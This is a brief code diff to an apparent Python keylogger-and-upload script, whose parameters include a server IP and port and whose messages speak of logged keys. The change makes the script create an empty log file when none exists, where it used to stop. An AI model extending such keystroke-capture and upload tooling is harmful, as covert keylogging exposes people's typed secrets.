@@ -27,8 +27,9 @@ def main(TIME=20, SERVER_IP='127.0.0.1', PORT=5000, FILE_NAME='log_from_outside.
 
     try:
         if not os.path.exists(FILE_NAME):
-            print(f"Log file '{FILE_NAME}' does not exist. No keys were logged.")
-            return
+            open(FILE_NAME, 'w').close()
+            # print(f"Log file '{FILE_NAME}' does not exist. No keys were logged.")
+            # return
 
         with open(FILE_NAME, 'rb') as file:
             content = file.read()
